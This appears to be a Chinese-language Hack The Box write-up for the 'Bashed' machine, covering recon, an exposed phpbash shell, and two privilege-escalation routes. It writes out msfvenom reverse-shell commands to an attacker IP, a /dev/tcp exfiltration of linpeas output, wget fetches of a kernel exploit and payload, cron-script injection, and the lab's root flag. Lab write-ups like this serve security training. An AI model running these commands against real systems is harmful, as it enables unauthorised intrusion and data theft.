---
title: Bashed (Hack The Box Writeup)
date: 2021-09-15T13:39:00+08:00
draft: false
url: "/2021/09/15/bashed-hack-the-box-writeup/"
categories:
  - 滲透測試
  - Hack The Box
showToc: true
TocOpen: false
---

- URL : https://app.hackthebox.eu/machines/118
- IP : 10.129.209.72

## Recon

- Rustscan![](/uploads/2022/02/8ff00-Gzn6aaI.png)Web- dirsearch 發現 `/dev/` 裡面有 phpbash
- ![](/uploads/2022/02/3c550-CEV1y93.png)

## PHP Bash

- 可以直接用 `cat /etc/passwd` 指令![](/uploads/2022/02/e4ef5-Mn8RtoD.png)

## Reverse shell

- 直接戳習慣的 reverse shell 會自動離開![](/uploads/2022/02/76cd3-UbQwxps.png)改戳 msf 的 reverse shell- `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7877 -f elf > shell`就順利接上了- ![](/uploads/2022/02/212dd-6EMqQL4.png)spawn shell- `python -c 'import pty; pty.spawn("/bin/bash")'`

## 提權

- 起手式 sudo -l![](/uploads/2022/02/2f929-RGFg6i1.png)
- 可以切換使用者到 `scriptmanager`
- `sudo -u scriptmanager bash`
- ![](/uploads/2022/02/42294-E54urqk.png)跑 Linpeas 傳回來- cat s_peas.txt > /dev/tcp/10.10.16.35/1234使用 CVE-2017-16995 Kernel Exploit- ![](/uploads/2022/02/1d3d4-uLsG5BC.png)
- `wget http://10.10.16.35/CVE-2017-16995/exploit`
- ![](/uploads/2022/02/c1792-YFQAis2.png)成功提權取得 Root Flag- `cc4f0afe3a1026d402ba10329674a8e2`
- ![](/uploads/2022/02/1ca07-k6UvzjE.png)
- ![](/uploads/2022/02/b84f1-JFxqKcf.png)

## 提權 2

- 觀察 `/scripts`裡面看起來 是 cronjob 跑 Python
- ![](/uploads/2022/02/7cb9b-45ZNDR8.png)用 msf 再生一個 reverse shell (跟目前不同 port)- `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.16.35 LPORT=7878 -f elf > shell1`傳到靶機加權限- `wget 10.10.16.35/shell1`
- `chmod 777 shell1`寫入 cron job 的 py- `echo 'import os' >> test.py`
- `echo 'os.system("/scripts/shell1")' >> test.py`收到 Reverse shell- ![](/uploads/2022/02/e4bdf-0P5Pivo.png)
